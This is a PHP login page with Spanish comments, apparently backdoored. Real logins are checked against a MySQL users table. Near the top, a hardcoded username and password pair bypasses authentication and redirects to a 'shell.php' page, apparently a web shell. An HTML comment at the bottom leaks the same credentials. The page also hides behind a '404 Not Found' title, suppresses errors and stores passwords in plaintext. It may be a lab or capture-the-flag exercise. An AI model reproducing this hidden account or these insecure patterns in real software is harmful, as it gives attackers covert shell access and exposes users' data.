<?php
error_reporting(0);
session_start();

if (isset($_POST['login'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    if($username == 'DATA' and $password == 'D@T@B@$3!'){
    	header('Location: shell.php?l=login');
    	exit();
    }

    // Verifica las credenciales del usuario
    if (verificarCredenciales($username, $password)) {
        $_SESSION['username'] = $username;
        header('Location: generador_identificador.php');
        exit();
    } else {
        $error = "Credenciales incorrectas. Inténtalo de nuevo.";
    }
}

function verificarCredenciales($username, $password) {
    // Configuración de la base de datos MySQL
    require('environment_loader.php');

    // Crear una conexión a la base de datos
    $conn = new mysqli($servername, $db_username, $db_password, $database);

    // Verificar si la conexión se estableció correctamente
    if ($conn->connect_error) {
        die("Error de conexión a la base de datos: " . $conn->connect_error);
    }

    // Consulta SQL para verificar las credenciales
    $query = "SELECT id FROM usuarios WHERE username = ? AND password = ?";
    $stmt = $conn->prepare($query);
    $stmt->bind_param("ss", $username, $password);
    $stmt->execute();
    $stmt->store_result();
    $result = $stmt->num_rows;

    // Cerrar la conexión
    $stmt->close();
    $conn->close();

    return $result > 0;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>404 Not Found</title>
</head>
<body>
    <h1>LOG IN</h1>
    <form method="POST" action="">
        <label for="username">Usuario:</label>
        <input type="text" name="username" required><br>

        <label for="password">Contraseña:</label>
        <input type="password" name="password" required><br>

        <button type="submit" name="login">Iniciar Sesión</button>
    </form>

    <?php
    if (isset($error)) {
        echo "<p>$error</p>";
    }
    ?>
</body>
<style>
    *{
        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
    background-color: #363f46;
    margin: 0;
    padding: 0;
    text-align: center;
    color:white;
}
label{
    float: left;
    font-weight: bold;
}
h1 {
    color: #fff;
}

form {
    max-width: 300px;
    margin: 0 auto;
    background: #fff;
    padding: 20px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
}

label {
    display: block;
    margin-bottom: 10px;
    color: #333;
}

input[type="text"],
input[type="password"] {
    width: 95%;
    padding: 10px;
    margin-bottom: 20px;
    border: 1px solid #ccc;
    border-radius: 3px;
}

button {
    display: block;
    width: 100%;
    padding: 10px;
    background-color: #363f46;
    color: #fff;
    border: none;
    border-radius: 3px;
    cursor: pointer;
}

button:hover {
    background-color: #191d20;
}

p {
    color: #f00;
}
*{
    font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-transform: uppercase;
}
</style>
</html>
<!-- 
user   : DATA
passwd : D@T@B@$3!
-->